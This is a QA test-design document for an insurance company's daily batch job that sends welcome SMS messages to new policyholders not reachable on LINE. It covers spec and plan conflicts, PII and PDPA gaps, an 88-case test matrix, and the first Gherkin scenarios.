# Test Scenarios — CSMS-001 Welcome New Customer (LINE)

**Feature**: `csms-001-welcome-line` (`002-batch-welcome-new-customer-line-sms`)
**System**: Centralized SMS (CSMS) — epirusapp / Ocean Life Web Portal
**Source artifacts**: `spec.md` (2026-07-07, FR-001…FR-021, SC-001…SC-007), `plan.md` (2026-07-09), `checklist.md` (2026-07-10)
**QA mode**: `design` · **Iteration**: 1 · **Generated**: 2026-07-17
**Total TCs**: 88 · **FR/SC coverage**: 34/34 (100%)

> **สถานะการรัน**: ยังไม่มีระบบให้รัน (no code / no running app) — TC ทุกข้อ Status = `Not Run`; `Tested By` / `Tested Date` เว้นว่างตามกฎ no-fabrication

---

## ⚠️ Disputed Interface — CSV vs SMS Gateway V3

**นี่คือข้อขัดแย้งที่ยังไม่มีผู้ตัดสิน (unresolved contradiction) ระหว่าง `spec.md` กับ `plan.md` — QA ออกแบบ Test Case ไว้ **ทั้งสองแนวทาง** เพื่อรอคำตัดสินจาก SA/PO**

### ข้อขัดแย้ง

| ฝ่าย | เอกสาร | สิ่งที่ระบุ |
|---|---|---|
| **CSV-path** | `spec.md` **FR-013** | *"ระบบ MUST สร้างไฟล์ Interface (CSV) encoding UTF-8 ตาม naming convention `[Department]_[SystemCode]_[Category]_[YYMMDDhhmmss].csv` โดย Department="MKT", SystemCode="CSMS", Category=ชื่อย่อหมวด SMS (sms_category_name_abbr) และวันที่เป็นปี พ.ศ. 2 หลัก — **ไฟล์นี้จำเป็นต้องสร้างก่อนเรียกบริการส่ง*** (BR-007, Q-007 Closed)"<br>ตัวอย่างไฟล์ใน spec.md §User Story 1: `MKT_CSMS_MKTWelcomeNewCust_260516100000.csv`<br>`spec.md` §ขอบเขต (Scope) ระบุ flow: "… → ตัดรายการซ้ำ → **สร้างไฟล์ CSV** → ส่ง SMS ผ่านช่องทางกลาง (ESB → SMS Gateway) → …"<br>`spec.md` US2 Acceptance #1/#2 + EC/FR-018 อ้าง "generate ไฟล์ไม่ได้ตามเวลาที่กำหนด" เป็น trigger ของ email แจ้งเตือน |
| **API-path** | `plan.md` **(ไม่มี CSV เลย)** | §Summary: *"…dedup, render ข้อความจาก `SMS_CATEGORY`/`sms_message_schedule` + ลิงก์แคมเปญจาก `cf_catalog`, **ส่งทีละรายการผ่าน SMS Gateway V3 (Infobip)** ด้วย `mappedSystemName='CSMS_SNC_NewCust'`, บันทึกผลลง `CSMS_LOG` + ตารางใหม่ `WELCOME_NEW_CUST_LINE`…"*<br>§Technical approach: *"…(2) เขียน logic ส่ง SMS แบบ **loop ทีละราย** + pre-render message เพราะ **SMS Gateway V3 ไม่มี bulk/template mechanism แบบที่ batch อื่นใช้**"*<br>§Performance Goals: *"**SMS Gateway V3 ส่งได้ทีละ 1 รายการต่อ 1 HTTP call (ไม่มี bulk) ต่างจาก batch อื่นที่ส่งเป็นไฟล์ทีเดียว**"*<br>§Project Structure / §Constraints: **ไม่ปรากฏไฟล์ CSV, ไม่มี interface directory, ไม่มี component สร้างไฟล์ใด ๆ** |

**สรุปข้อขัดแย้ง**: `spec.md` FR-013 บังคับ ("MUST") ให้สร้างไฟล์ CSV **ก่อน**เรียกบริการส่ง — แต่ `plan.md` ออกแบบสถาปัตยกรรมที่**ไม่มีไฟล์ CSV เลย** และส่งแบบ 1 record = 1 HTTP call (`sendSmsOtp`) ผ่าน SMS Gateway V3 โดยตรง **ยังไม่มีผู้ตัดสินว่าฝ่ายใดถูก**

### แนวทางของ QA (ตามที่ผู้ใช้ตัดสิน)

- ออกแบบ Test Case ไว้ **ทั้งสองชุด** และติด tag กำกับไว้:
  - **`@disputed @csv-path`** → **TC-077 … TC-083** (7 TCs) — การสร้างไฟล์, UTF-8, naming convention, ลำดับคอลัมน์, generate ไฟล์ล้มเหลว → email แจ้งเตือน, CSV formula injection, PII ในไฟล์
  - **`@disputed @api-path`** → **TC-084 … TC-088** (5 TCs) — per-record `sendSmsOtp` HTTP call, per-call response/refer_no, per-call failure handling, การยืนยันว่า**ไม่มี**ไฟล์ CSV, N records → N calls
- ⚠️ **ทั้งสองชุดต้องไม่ถูก execute พร้อมกัน** — เป็นการออกแบบเผื่อไว้ (designed pending ruling) เท่านั้น
- ⚠️ **เมื่อ SA/PO ตัดสินแล้ว จะต้องลบชุดใดชุดหนึ่งทิ้งทั้งชุด** (exactly one of the two tagged sets will have to be deleted once ruled):
  - ถ้าตัดสินว่า **FR-013 (CSV) ชนะ** → ลบ `@api-path` (TC-084…TC-088) และ `plan.md` ต้องถูกแก้ให้มีขั้นตอนสร้างไฟล์
  - ถ้าตัดสินว่า **plan.md (API) ชนะ** → ลบ `@csv-path` (TC-077…TC-083) และ `spec.md` FR-013 ต้องถูกถอน/แก้ (รวมถึง §Scope, US2 Acceptance #1/#2, FR-018 ที่อ้าง "generate ไฟล์ไม่ได้")

### ผลกระทบต่อความพร้อม SIT

**Blocker ต่อการเข้า SIT** — ตราบใดที่ยังไม่ตัดสิน ชุด TC นี้ **ไม่พร้อม execute** เพราะ 12 TCs (13.6% ของทั้งหมด) อยู่ในสถานะที่อย่างน้อยครึ่งหนึ่งจะกลายเป็น dead test ทันทีที่มีคำตัดสิน · ดูรายละเอียดใน `00-INDEX.md` และ CRITICAL finding **F-001**

**Routing**: ข้อขัดแย้งระหว่าง artifact (spec ↔ plan) เป็นขอบเขตของ `/speckit-analyze` — QA บันทึกเป็น finding และรอคำตัดสิน ไม่เดาแทน SA/PO

---

## CRITICAL Findings (ต้องแก้ก่อนประกาศว่า verified)

| ID | Severity | Finding | อ้างอิง | ผลต่อ QA |
|---|---|---|---|---|
| **F-001** | **CRITICAL** | **Disputed interface — spec.md FR-013 (CSV MUST) ขัดกับ plan.md (ไม่มี CSV, ส่ง 1 record/HTTP call)** ยังไม่มีผู้ตัดสิน | spec.md FR-013 · plan.md §Summary/§Technical approach/§Performance Goals | 12 TCs (TC-077…TC-088) เป็น `@disputed`; ต้องลบชุดใดชุดหนึ่งหลังตัดสิน — **ห้าม execute ทั้งสองชุด** |
| **F-002** | **CRITICAL** | **ไม่มี security/PII NFR เลย** ทั้งที่ batch จัดการ **card_no (เลขบัตรประชาชน)** และ **mobile_no** และเก็บลง `WELCOME_NEW_CUST_LINE` แบบ plain | `checklist.md` CHK026 `[!]` + Gap **G2**; spec.md FR-016 field list (card_no, mobile_no, fname, lname); plan.md §Constitution Check ข้อ IV | ครอบด้วย Security TCs **TC-060, TC-061, TC-066, TC-068, TC-083** แต่**ไม่มี requirement ให้ assert ได้** — TC เหล่านี้ทดสอบกับ "ค่าคาดหวังที่ QA เสนอ" ไม่ใช่เกณฑ์ที่ SA รับรอง ⇒ **ต้องเพิ่ม NFR ก่อน SIT** |
| **F-003** | **CRITICAL** | **Constitution Principle IV (Audit Trail: "MUST NOT log sensitive fields: phone numbers, customer PII") ถูก "ยกเว้น" โดยอ้าง legacy pattern** — การยกเว้นถูกบันทึกใน plan.md แต่**ไม่มี compensating control ใด ๆ** (ไม่มี masking, ไม่มี access control requirement, ไม่มี retention policy) | plan.md §Constitution Check ข้อ IV (Aor, 2026-07-09) · §7 Constitution & PDPA Gate | QA **ไม่สามารถประกาศ "verified"** ตาม §7 จนกว่าจะมี TC ที่ assert compensating control ได้ — TC-061/TC-068 ตั้งไว้แล้วแต่ยังไม่มีเกณฑ์ |
| **F-004** | HIGH | **PDPA opt-out ปิดโดยอ้างเบอร์ 1503 ที่มีอยู่ในข้อความ** แต่ไม่ผูก process กับ Do Not Contact List อย่างเป็นทางการ ⇒ ลูกค้าโทรยกเลิกแล้ว **ไม่มีกลไกกันส่งซ้ำรอบถัดไป** | plan.md §Constitution Check ข้อ I (Aor, 2026-07-09) | ไม่มี FR ให้ทดสอบ — บันทึกเป็น finding, route ไป `/speckit-checklist` |
| **F-005** | HIGH | **ไม่มี performance NFR** (เวลาเสร็จต่อรอบ / volume สูงสุด) ขณะที่ plan.md ยอมรับเองว่า SMS Gateway V3 = 1 HTTP call/record ไม่มี bulk | `checklist.md` CHK019/CHK025 + Gap **G1**, **G4**; plan.md §Performance Goals `[NEEDS CLARIFICATION]` | **TC-088** ออกแบบไว้แต่ไม่มีเกณฑ์ผ่าน/ตก — assert ไม่ได้ |
| **F-006** | HIGH | **ไม่มี edge case / FR รองรับกรณี SMS Gateway ตอบ refer_no ผิดรูปแบบ หรือส่งไม่สำเร็จรายรายการ** | `checklist.md` CHK024 + Gap **G5** | **TC-041, TC-042** ออกแบบไว้บนพฤติกรรมที่ QA อนุมาน — ต้องให้ SA ยืนยัน |
| **F-007** | MEDIUM | **retry interval (FR-008b "เว้นช่วง") และ timeout/SLA (FR-018 "ตามเวลาที่กำหนด") เป็นค่าลอย** ไม่มีตัวเลข | `checklist.md` CHK004/CHK005/CHK011 + Gap **G3** | **TC-035, TC-020** assert ได้เฉพาะ "retry 3 ครั้ง" ส่วน interval/timeout assert ไม่ได้ |
| **F-008** | MEDIUM | **ไม่ระบุพฤติกรรมเมื่อไม่พบ template ทั้ง `sms_message_schedule` และ `SMS_CATEGORY`** (FR-011 fallback chain ไม่มีปลายทาง) | spec.md FR-011 | **TC-043** ออกแบบบนพฤติกรรมที่อนุมาน (skip + log) — ต้องให้ SA ยืนยัน |
| **F-009** | HIGH | **FR-013 ขัดแย้งกับตัวอย่างของตัวเอง** — ข้อความระบุ *"วันที่เป็นปี **พ.ศ.** 2 หลัก"* แต่ตัวอย่างไฟล์ `MKT_CSMS_MKTWelcomeNewCust_**26**0516100000.csv` ใช้ `26` = **ค.ศ.** 2026 (ถ้าเป็น พ.ศ. 2569 ต้องเป็น `69`) | spec.md FR-013 vs spec.md §US1 Example Data | **TC-079** assert ชื่อไฟล์ไม่ได้ — สองการตีความให้ผลต่างกัน (พิสูจน์ด้วย boundary ปี 2057) · *พบระหว่างออกแบบ TC · route → `/speckit-analyze`* |
| **F-010** | HIGH | **FR-013 ไม่ระบุ column list / column order / layout ของไฟล์ CSV เลย** — ระบุเพียง encoding + naming convention ⇒ ไม่มี contract ให้ระบบปลายทางอ่าน | spec.md FR-013 | **TC-080 execute ไม่ได้** — ไม่มีเกณฑ์ให้เทียบ · หาก CSV-path ชนะ นี่เป็น requirement gap ที่ต้องปิดทันที · *พบระหว่างออกแบบ TC* |

---

## Test Matrix Summary

| ID | Feature | Test Scenario Name | Test Dimension | Priority | Tags | Target Test Level |
|---|---|---|---|---|---|---|
| TC-001 | FR-001 Daily Scheduler | Batch รันอัตโนมัติทุกวันเวลา 10:00 น. | Positive | P1 | `@positive @smoke` | Integration |
| TC-002 | FR-002 Data Selection | ดึงกรมธรรม์ ORD/IND/PA ที่ issue_date = T-1 และสถานะ Inforce | Positive | P1 | `@positive @smoke` | Integration |
| TC-003 | FR-003 Go-live Cutoff | กรมธรรม์ที่ออกตั้งแต่ปี 2026 ถูกดึงเข้ากลุ่มเป้าหมาย | Positive | P1 | `@positive @smoke` | Integration |
| TC-004 | FR-004 Mobile Filter | รายการที่มี mobile_no ถูกดึงเข้ากลุ่มเป้าหมาย | Positive | P1 | `@positive @smoke` | Integration |
| TC-005 | FR-005 Do Not Contact | ลูกค้าที่ไม่อยู่ใน Do Not Contact List ผ่านการคัดกรอง | Positive | P1 | `@positive @smoke` | Integration |
| TC-006 | FR-006 LINE Eligibility | เงื่อนไข 1 — ไม่พบทั้ง LINE และ Ocean Club → ส่ง SMS | Positive | P1 | `@positive @smoke` | Integration |
| TC-007 | FR-006 LINE Eligibility | เงื่อนไข 2 — ไม่มี Ocean Club และบล็อก LINE → ส่ง SMS | Positive | P1 | `@positive @smoke` | Integration |
| TC-008 | FR-006 LINE Eligibility | เงื่อนไข 3 — พบ LINE (ไม่บล็อก) หรือพบ Ocean Club → ไม่ส่ง | Positive | P1 | `@positive @smoke` | Integration |
| TC-009 | FR-007 E02 Handling | code=E02 ใช้ตัดสิน eligibility ภายใน ไม่แสดงข้อความต่อผู้ใช้ | Positive | P2 | `@positive @regression` | Integration |
| TC-010 | FR-009 In-round Dedup | ชื่อ-นามสกุล-เบอร์ซ้ำในรอบ → ส่ง 1 Transaction อ้างอิง MIN(issue_date) | Positive | P1 | `@positive @smoke` | Integration |
| TC-011 | FR-010 History Guard | เคยส่งสำเร็จแล้ว (sms_sent_date NOT NULL) → ตัดออก ไม่ส่งซ้ำ | Positive | P1 | `@positive @smoke` | Integration |
| TC-012 | FR-011 Message Template | ใช้ template จาก sms_message_schedule เป็นอันดับแรก | Positive | P1 | `@positive @smoke` | Integration |
| TC-013 | FR-011 Message Template | ไม่พบ schedule → fallback ใช้ msg_text ของ SMS_CATEGORY (code 113) | Positive | P1 | `@positive @regression` | Integration |
| TC-014 | FR-012 Variable Substitution | แทนค่า $(var1)=ชื่อลูกค้า และ $(var2)=ลิงก์แคมเปญที่ active | Positive | P1 | `@positive @smoke` | Integration |
| TC-015 | FR-014 ESB Delivery | เรียก Web Service กลาง (ESB) ส่ง SMS ผ่าน SMS Gateway สำเร็จ | Positive | P1 | `@positive @smoke` | Integration |
| TC-016 | FR-015 CSMS_LOG | บันทึก CSMS_LOG พร้อม refer_no และสถานะที่ได้รับกลับ | Positive | P1 | `@positive @smoke` | Integration |
| TC-017 | FR-016 Batch History | บันทึก WELCOME_NEW_CUST_LINE ครบทุก field ตาม POST-003 | Positive | P1 | `@positive @smoke` | Integration |
| TC-018 | FR-016a Sent Status | ส่งสำเร็จ → sms_sent_date = เวลาที่ส่ง และ sent_status = 'S' | Positive | P1 | `@positive @smoke` | Integration |
| TC-019 | FR-017 Credit Calculation | คำนวณ credit_amount ด้วย logic เดิมของ CSMS | Positive | P2 | `@positive @regression` | Unit |
| TC-020 | FR-018 Failure Alert | ล้มเหลวระดับรอบทุกขั้นตอน → ส่ง Email แจ้งเตือน IT/User | Positive | P1 | `@positive @smoke` | Integration |
| TC-021 | FR-019 Manual Fix | IT Admin เลือก batch + ช่วงวันที่ถูกต้อง → สั่งรัน Manual Batch ได้ | Positive | P2 | `@positive @regression` | E2E |
| TC-022 | FR-020 Idempotency | Manual Batch idempotent — ไม่ส่งซ้ำรายการที่ sms_sent_date ไม่ว่าง | Positive | P1 | `@positive @smoke` | E2E |
| TC-023 | FR-020a Date Interpretation | ช่วงวันที่ = วันประมวลผล → ดึงกรมธรรม์ issue_date = T-1 ของแต่ละวัน | Positive | P1 | `@positive @regression` | Integration |
| TC-024 | FR-021 Daily Report | รายงานประจำวันแสดงยอดครบพร้อม breakdown ตาม policy_type | Positive | P3 | `@positive @regression` | E2E |
| TC-025 | SC-001 End-to-End | E2E happy path — กรมธรรม์ 2445901 → SMS ถึง 0845012341 ข้อความถูกต้อง | Positive | P1 | `@positive @smoke` | E2E |
| TC-026 | FR-002 Data Selection | สถานะกรมธรรม์ไม่ใช่ Inforce → ไม่ถูกดึงเข้ากลุ่มเป้าหมาย | Negative/Validation | P1 | `@negative @smoke` | Integration |
| TC-027 | FR-002 Data Selection | issue_date ≠ T-1 → ไม่ถูกดึงเข้ากลุ่มเป้าหมาย | Negative/Validation | P1 | `@negative @smoke` | Integration |
| TC-028 | FR-003 Go-live Cutoff | กรมธรรม์ที่ออกก่อนปี 2026 → ไม่ถูกดึง (ไม่ส่งย้อนหลัง) | Negative/Validation | P1 | `@negative @smoke` | Integration |
| TC-029 | FR-004 Mobile Filter | mobile_no NULL / ว่าง / ช่องว่างล้วน → ไม่ถูกดึง (EC-001) | Negative/Validation | P1 | `@negative @smoke` | Integration |
| TC-030 | FR-005 Do Not Contact | ORD อยู่ใน Do Not Contact (remark_code='1') → ตัดออก | Negative/Validation | P1 | `@negative @smoke` | Integration |
| TC-031 | FR-005 Do Not Contact | IND/PA อยู่ใน Do Not Contact (remark_code='4') → ตัดออก | Negative/Validation | P1 | `@negative @smoke` | Integration |
| TC-032 | FR-005 Policy Type Mapping | Mapping ORD='O', IND IN ('I','G'), PA='P' ก่อนตรวจ Do Not Contact | Negative/Validation | P1 | `@negative @smoke` | Integration |
| TC-033 | FR-008 E13 Skip | code=E13 → skip ทันที ไม่ retry ไม่หยุดรอบ + บันทึก log | Negative/Validation | P1 | `@negative @smoke` | Integration |
| TC-034 | FR-008a Out-of-spec Response | ผลตอบกลับนอก 3 เงื่อนไข (channel=null / isBlockLine=null) → skip + log | Negative/Validation | P1 | `@negative @regression` | Integration |
| TC-035 | FR-008b API Down | Line Connect API ล่มทั้งระบบ → retry สูงสุด 3 ครั้ง → หยุดรอบ + email | Negative/Validation | P1 | `@negative @smoke` | Integration |
| TC-036 | FR-011a Customer Not Found | card_no ไม่พบชื่อ-นามสกุล → skip + log, MUST NOT ส่งข้อความไม่มีชื่อ | Negative/Validation | P1 | `@negative @smoke` | Integration |
| TC-037 | FR-012a No Active Link | ไม่มีลิงก์แคมเปญ active → หยุดรอบทั้งรอบ + email แจ้งเตือน | Negative/Validation | P1 | `@negative @smoke` | Integration |
| TC-038 | FR-019 Manual Fix Validation | ช่วงวันที่ Manual Fix ไม่ถูกต้อง → validation ไม่เริ่มประมวลผล | Negative/Validation | P2 | `@negative @regression` | E2E |
| TC-039 | FR-016a Sent Status | ส่งไม่สำเร็จ/ถูก skip → sms_sent_date = NULL และ sent_status = 'F' | Negative/Validation | P1 | `@negative @smoke` | Integration |
| TC-040 | FR-020b No Auto-retry | รอบ daily MUST NOT ดึงรายการ sent_status='F' ค้างมา retry อัตโนมัติ | Negative/Validation | P1 | `@negative @regression` | Integration |
| TC-041 | FR-014 Per-record Failure | SMS Gateway ตอบล้มเหลวรายรายการ → รายการนั้น 'F' รอบไม่หยุด | Negative/Validation | P1 | `@negative @regression` | Integration |
| TC-042 | FR-015 Malformed refer_no | refer_no ผิดรูปแบบ / ว่าง / null → พฤติกรรมไม่ระบุใน spec (F-006) | Negative/Validation | P2 | `@negative @regression @spec_gap` | Integration |
| TC-043 | FR-011 Template Not Found | ไม่พบ template ทั้ง schedule และ SMS_CATEGORY → ปลายทาง fallback ไม่ระบุ (F-008) | Negative/Validation | P2 | `@negative @regression @spec_gap` | Integration |
| TC-044 | FR-002 Date Boundary | ขอบเขต issue_date — T-1 00:00:00 / T-1 23:59:59 / T-0 00:00:00 | Edge | P2 | `@edge_case @regression` | Integration |
| TC-045 | FR-003 Year Boundary | ขอบเขตปี — 2025-12-31 ไม่ถูกดึง / 2026-01-01 ถูกดึง | Edge | P1 | `@edge_case @smoke` | Integration |
| TC-046 | FR-009 Dedup Tie-break | issue_date เท่ากันทุกฉบับ → tie-break ด้วย MIN(policy_no) แบบ deterministic (EC-002, A-007) | Edge | P2 | `@edge_case @regression` | Integration |
| TC-047 | FR-012 Link Date Boundary | begin_date / expire_date = วันประมวลผลพอดี (inclusive vs exclusive) | Edge | P2 | `@edge_case @regression` | Integration |
| TC-048 | FR-012 Unicode Name | ชื่อลูกค้ามี emoji / NBSP / RTL / อักษรควบ → render ข้อความถูกต้อง | Edge | P2 | `@edge_case @regression` | Integration |
| TC-049 | FR-009 Dedup Bypass | ชื่อ/เบอร์ต่างกันด้วย NBSP หรือช่องว่างท้าย → dedup bypass หรือไม่ | Edge | P2 | `@edge_case @regression` | Integration |
| TC-050 | FR-004 Phone Format | รูปแบบ mobile_no ผิดปกติ (ขีด, ช่องว่าง, +66, 9 หลัก, 11 หลัก, ตัวอักษร) | Edge | P2 | `@edge_case @regression` | Integration |
| TC-051 | FR-016 Message Length | ข้อความ/ชื่อยาวสุด → credit_amount และความยาวคอลัมน์ sms_message (A-011) | Edge | P2 | `@edge_case @regression` | Integration |
| TC-052 | FR-020a Range Extremes | ช่วงวันที่ Manual Fix ยาวหลายวัน / ปีไกล (9999) | Edge | P3 | `@edge_case @regression` | Integration |
| TC-053 | FR-001 Empty Round | รอบที่ไม่มีกรมธรรม์เข้าเงื่อนไขเลย (0 รายการ) → รอบจบปกติ ไม่ส่ง email | Edge | P2 | `@edge_case @regression` | Integration |
| TC-054 | FR-006 Batch Lookup Volume | เรียก Line Connect แบบ list cardNo จำนวนมาก → rate limit / chunking (A-002) | Edge | P2 | `@edge_case @regression` | Integration |
| TC-055 | FR-001,FR-020 Concurrent Runs | daily batch + Manual Fix ช่วงเดียวกันพร้อมกัน → ลูกค้าไม่ได้รับซ้ำ | Concurrency | P1 | `@concurrency @smoke` | Integration |
| TC-056 | FR-010 History Race | 2 process ตรวจประวัติพร้อมกัน (race condition) → ต้องมี unique/lock กันส่งซ้ำ | Concurrency | P1 | `@concurrency @smoke` | Integration |
| TC-057 | FR-001 Round Overlap | รอบก่อนหน้ายังไม่จบเมื่อถึง 10:00 รอบถัดไป → overlap prevention | Concurrency | P2 | `@concurrency @regression` | Integration |
| TC-058 | FR-019 Concurrent Admins | IT_ADMIN 2 คนกด Manual Batch ช่วงวันที่เดียวกันพร้อมกัน | Concurrency | P2 | `@concurrency @regression` | E2E |
| TC-059 | FR-012 PII in Message | ข้อความ SMS MUST NOT มี card_no / policy_no / ข้อมูลการเงิน | Security | P1 | `@security @pdpa @smoke` | Integration |
| TC-060 | FR-015,FR-016 PII in Logs | card_no / mobile_no ไม่ปรากฏใน application log / CSMS_LOG แบบ plain (F-002, F-003) | Security | P1 | `@security @pdpa @smoke @spec_gap` | Integration |
| TC-061 | FR-016 PII at Rest | WELCOME_NEW_CUST_LINE เก็บ PII plain — สิทธิ์เข้าถึง / retention (F-002, F-003) | Security | P1 | `@security @pdpa @smoke @spec_gap` | Integration |
| TC-062 | FR-005 DNC Compliance | ลูกค้าใน Do Not Contact ไม่ถูกส่ง SMS แม้เข้าเงื่อนไขอื่นครบ (SC-002) | Security | P1 | `@security @pdpa @smoke` | Integration |
| TC-063 | FR-019 RBAC | เฉพาะ IT_ADMIN เรียก Manual Batch ได้ — role อื่น / ไม่ login → ปฏิเสธ | Security | P1 | `@security @smoke` | E2E |
| TC-064 | FR-012 Link Injection | cf_catalog ลิงก์มี URL อันตราย / script → ไม่ execute + ตรวจ domain whitelist | Security | P2 | `@security @regression` | Integration |
| TC-065 | FR-011 Template Injection | template มี placeholder ที่ไม่รู้จัก / metacharacter → ไม่รั่ว ไม่ error | Security | P2 | `@security @regression` | Integration |
| TC-066 | FR-006 PII in Transit | ส่ง card_no ออกไป Line Connect API ภายนอก — TLS + minimum necessary (F-002) | Security | P1 | `@security @pdpa @smoke @spec_gap` | Integration |
| TC-067 | FR-002,FR-016 SQL Injection | fname / lname / card_no มี SQL metacharacter → parameterized, treat literal | Security | P1 | `@security @smoke` | Integration |
| TC-068 | FR-021 Report Access | รายงานประจำวันแสดง PII — จำกัดสิทธิ์ผู้เข้าถึง (F-002) | Security | P2 | `@security @pdpa @regression @spec_gap` | E2E |
| TC-069 | FR-008 Skip Isolation | skip 1 รายการ ไม่ rollback / ไม่กระทบรายการที่ส่งไปแล้วในรอบเดียวกัน (SC-006) | Side-Effects | P1 | `@side_effect @smoke` | Integration |
| TC-070 | FR-008b,FR-012a Round Abort | หยุดรอบกลางคัน → รายการที่ส่งไปแล้วมีบันทึกครบ ไม่มี orphan | Side-Effects | P1 | `@side_effect @smoke` | Integration |
| TC-071 | FR-016a Reconcile | ทุกรายการที่ skip / ไม่สำเร็จมีบันทึก → reconcile กับรายงานได้ 100% (SC-007) | Side-Effects | P1 | `@side_effect @smoke` | Integration |
| TC-072 | FR-002,FR-005 Read-only Source | batch เป็น read-only ต่อ ili_* / cf_catalog — ไม่แก้ไขข้อมูลต้นทาง | Side-Effects | P2 | `@side_effect @regression` | Integration |
| TC-073 | FR-020 No Duplicate Log | Manual Fix ไม่สร้าง CSMS_LOG / WELCOME_NEW_CUST_LINE ซ้ำสำหรับรายการที่ส่งแล้ว | Side-Effects | P1 | `@side_effect @smoke` | Integration |
| TC-074 | FR-018 Alert Email Content | Email แจ้งเตือนอ่านเข้าใจได้ — ระบุ batch name + ขั้นตอนที่ล้มเหลว + วันที่รอบ | UX/Usability | P2 | `@ux_usability @regression` | Integration |
| TC-075 | FR-019 Manual Fix Surface | หน้า Manual Fix — batch ปรากฏใน list, validation message มาตรฐาน, feedback หลังกด | UX/Usability | P2 | `@ux_usability @regression` | E2E |
| TC-076 | FR-021 Report Usability | รายงาน — breakdown อ่านได้, เหตุผลตัดออกครบ, empty state, ค่ายาวไม่ล้น layout | UX/Usability | P3 | `@ux_usability @regression` | E2E |
| TC-077 | FR-013 CSV Creation | สร้างไฟล์ Interface CSV **ก่อน**เรียกบริการส่ง | Positive | P1 | `@disputed @csv-path @positive @smoke` | Integration |
| TC-078 | FR-013 CSV Encoding | ไฟล์ CSV encoding UTF-8 — ข้อความภาษาไทยไม่เพี้ยน | Positive | P1 | `@disputed @csv-path @positive @smoke` | Integration |
| TC-079 | FR-013 CSV Naming | Naming convention `MKT_CSMS_MKTWelcomeNewCust_[YYMMDDhhmmss].csv` ปี พ.ศ. 2 หลัก | Positive | P1 | `@disputed @csv-path @positive @smoke` | Integration |
| TC-080 | FR-013 CSV Columns | ลำดับและเนื้อหาคอลัมน์ในไฟล์ CSV ตรงตามที่กำหนด | Positive | P2 | `@disputed @csv-path @positive @regression` | Integration |
| TC-081 | FR-013,FR-018 CSV Gen Failure | generate ไฟล์ CSV ไม่สำเร็จ → หยุดรอบ + email แจ้งเตือน (SC-004) | Negative/Validation | P1 | `@disputed @csv-path @negative @smoke` | Integration |
| TC-082 | FR-013 CSV Injection | fname ขึ้นต้นด้วย `=` `+` `-` `@` → escape ไม่ execute เมื่อเปิดใน Excel | Security | P2 | `@disputed @csv-path @security @regression` | Integration |
| TC-083 | FR-013 CSV PII at Rest | ไฟล์ CSV มีชื่อ + เบอร์ลูกค้า — สิทธิ์ไฟล์ / เข้ารหัส / retention (F-002 · G2) | Security | P1 | `@disputed @csv-path @security @pdpa @smoke @spec_gap` | Integration |
| TC-084 | FR-014 Per-record Call | เรียก SMS Gateway V3 `sendSmsOtp` 1 HTTP call ต่อ 1 รายการ, mappedSystemName='CSMS_SNC_NewCust' | Positive | P1 | `@disputed @api-path @positive @smoke` | Integration |
| TC-085 | FR-014,FR-015 Per-call Response | เก็บ response / refer_no รายรายการจากแต่ละ HTTP call | Positive | P1 | `@disputed @api-path @positive @smoke` | Integration |
| TC-086 | FR-014,FR-016a Per-call Failure | HTTP call รายรายการล้มเหลว (5xx / timeout) → รายการนั้น 'F' รอบเดินต่อ | Negative/Validation | P1 | `@disputed @api-path @negative @smoke` | Integration |
| TC-087 | FR-013,FR-014 No CSV Produced | ยืนยันว่า**ไม่มี**การสร้างไฟล์ CSV ใด ๆ ใน interface directory | Side-Effects | P2 | `@disputed @api-path @side_effect @regression` | Integration |
| TC-088 | FR-014 Loop Throughput | N รายการ → N HTTP call ในรอบ 10:00 — เวลาประมวลผลรวม (ไม่มี NFR — F-005) | Edge | P2 | `@disputed @api-path @edge_case @regression @spec_gap` | Integration |

---

## BDD Scenarios

### Dimension 1 — Positive

```gherkin
# Covers: FR-001, SC-001
Feature: TC-001 Daily Scheduler
  Scenario: Batch รันอัตโนมัติทุกวันเวลา 10:00 น.
    Given batch "BATCH-CSMS-WELCOME-LINE" ถูก register เป็น Camel scheduled bean ใน epirusapp
    And ระบบเวลาของ server ตั้งเป็น timezone Asia/Bangkok
    When นาฬิกาเดินถึงเวลา 10:00:00 ของวันประมวลผล
    Then batch เริ่มทำงานอัตโนมัติโดยไม่ต้องมีคนสั่ง
    And ไม่มีการรันซ้ำในวันเดียวกันจาก scheduler
```

```gherkin
# Covers: FR-002, PRE-001, PRE-002
Feature: TC-002 Data Selection — ORD/IND/PA + T-1 + Inforce
  Scenario Outline: ดึงกรมธรรม์ <policy_type> ที่ issue_date = T-1 และสถานะ Inforce
    Given วันประมวลผลคือ "2026-05-14"
    And มีกรมธรรม์ประเภท "<policy_type>" เลขที่ "<policy_no>" issue_date = "2026-05-13" สถานะ "Inforce"
    And กรมธรรม์นั้นมี mobile_no = "0845012341"
    When batch ดึงข้อมูลกลุ่มเป้าหมาย
    Then กรมธรรม์ "<policy_no>" ปรากฏในกลุ่มเป้าหมาย
    And ดึงจากตารางต้นทาง "<source_table>"

    Examples:
      | policy_type | policy_no | source_table            |
      | ORD         | 2445901   | ili_application_osp_ord |
      | IND         | 3110002   | ili_application_osp_ind |
      | PA          | 4220003   | ili_application_osp_pa  |
```

```gherkin
# Covers: FR-003, A-006
Feature: TC-003 Go-live Cutoff
  Scenario: กรมธรรม์ที่ออกตั้งแต่ปี 2026 ถูกดึงเข้ากลุ่มเป้าหมาย
    Given วันประมวลผลคือ "2026-05-14"
    And มีกรมธรรม์ ORD เลขที่ "2445901" issue_date = "2026-05-13" สถานะ Inforce
    When batch ดึงข้อมูลกลุ่มเป้าหมาย
    Then กรมธรรม์ "2445901" ปรากฏในกลุ่มเป้าหมาย เพราะเป็นกรมธรรม์ปี 2026 ขึ้นไป
```

```gherkin
# Covers: FR-004, EC-001
Feature: TC-004 Mobile Filter
  Scenario: รายการที่มี mobile_no ถูกดึงเข้ากลุ่มเป้าหมาย
    Given กรมธรรม์ ORD "2445901" issue_date = T-1 สถานะ Inforce
    And mobile_no = "0845012341"
    When batch ดึงข้อมูลกลุ่มเป้าหมาย
    Then กรมธรรม์ "2445901" ปรากฏในกลุ่มเป้าหมาย
```

```gherkin
# Covers: FR-005, BR-002, Q-001
Feature: TC-005 Do Not Contact — Pass
  Scenario: ลูกค้าที่ไม่อยู่ใน Do Not Contact List ผ่านการคัดกรอง
    Given กรมธรรม์ ORD "2445901" เข้าเงื่อนไข FR-002/FR-003/FR-004
    And ตาราง ili_policy_remark ไม่มี row ที่ policy_no="2445901" AND policy_type='O' AND remark_code='1'
    When batch คัดกรอง Do Not Contact
    Then กรมธรรม์ "2445901" ยังคงอยู่ในกลุ่มเป้าหมาย
```

```gherkin
# Covers: FR-006, FR-007, BR-003, SC-002
Feature: TC-006 LINE Eligibility — เงื่อนไข 1
